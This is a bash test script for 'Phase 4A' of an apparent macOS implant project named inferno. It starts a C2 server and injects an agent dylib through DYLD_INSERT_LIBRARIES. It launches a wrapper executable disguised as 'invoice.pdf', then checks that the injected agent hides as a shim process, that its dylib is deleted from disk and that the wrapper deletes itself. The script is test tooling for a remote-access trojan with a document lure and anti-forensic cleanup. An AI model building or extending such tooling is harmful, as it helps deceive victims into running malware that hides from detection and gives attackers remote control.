#!/bin/bash
set -e

SERVER_IP="127.0.0.1"
SERVER_PORT=4242
BUILD_DIR=$(cd "$(dirname "$0")/build" && pwd)
export PATH="$BUILD_DIR:$PATH"

echo "=== Phase 4A — Manual Verification ==="
echo ""

# 0. Cleanup any stale processes
pkill -f inferno_client 2>/dev/null || true
pkill -f inferno_shim  2>/dev/null || true
pkill -f inferno_server 2>/dev/null || true
pkill -f invoice.pdf   2>/dev/null || true
rm -f /tmp/.inferno_agent.dylib

# 1. Build
echo "--- Step 0: Build ---"
cmake --build build 2>&1 | tail -1
echo ""

# 2. Unit tests
echo "--- Stage 1: Unit Tests ---"
./build/inferno_tests 2>&1 | grep -E "injector|PASS|FAIL"
echo ""

# 3. Stage 2: Shim loads dylib directly (cold load test)
echo "--- Stage 2: Shim + Dylib Direct Load ---"
INFERNO_SERVER_IP=$SERVER_IP \
INFERNO_SERVER_PORT=$SERVER_PORT \
DYLD_INSERT_LIBRARIES=./build/libinferno_agent.dylib \
./build/inferno_shim &
SHIM_PID=$!
sleep 2

if kill -0 $SHIM_PID 2>/dev/null; then
    echo "[PASS] inferno_shim is running (PID $SHIM_PID)"
else
    echo "[FAIL] inferno_shim exited unexpectedly"
    exit 1
fi

if ps aux | grep -q "[i]nferno_client"; then
    echo "[FAIL] inferno_client process found"
    exit 1
else
    echo "[PASS] No inferno_client process"
fi

# Record shim PID before kill for cleanup log
echo "[INFO] Killing shim (PID $SHIM_PID)"
kill $SHIM_PID 2>/dev/null || true
wait $SHIM_PID 2>/dev/null || true
echo ""

# 4. Stage 3: Full wrapper → server injection
echo "--- Stage 3: Wrapper Injection with C2 Server ---"
./build/inferno_server &
SERVER_PID=$!
sleep 2

if kill -0 $SERVER_PID 2>/dev/null; then
    echo "[PASS] inferno_server is running (PID $SERVER_PID)"
else
    echo "[FAIL] inferno_server failed to start"
    exit 1
fi

# Kill any remaining stale agents before running wrapper
pkill -f inferno_shim 2>/dev/null || true
pkill -f inferno_client 2>/dev/null || true
sleep 1

"$BUILD_DIR/wrapper/invoice.pdf" $SERVER_IP $SERVER_PORT &
WRAPPER_PID=$!
sleep 4

# Check shim is running (injected)
if ps aux | grep -q "[i]nferno_shim"; then
    echo "[PASS] inferno_shim running after wrapper injection"
else
    echo "[FAIL] inferno_shim not found"
    exit 1
fi

# Check no standalone client
if ps aux | grep -q "[i]nferno_client"; then
    echo "[FAIL] inferno_client process found (should be injected)"
    exit 1
else
    echo "[PASS] No inferno_client process"
fi

# Check dylib was deleted from disk
if [ -f /tmp/.inferno_agent.dylib ]; then
    echo "[FAIL] dylib still on disk at /tmp/.inferno_agent.dylib"
    exit 1
else
    echo "[PASS] Dylib deleted from disk after injection"
fi

# Check wrapper self-deleted
if ps aux | grep -q "[i]nvoice.pdf"; then
    echo "[INFO] Wrapper still running (may have not self-deleted yet)"
else
    echo "[PASS] Wrapper self-deleted"
fi

# Cleanup
kill $SERVER_PID 2>/dev/null || true
pkill -f inferno_shim 2>/dev/null || true
pkill -f invoice.pdf 2>/dev/null || true

echo ""
echo "=== Phase 4A: ALL VERIFICATIONS PASSED ==="
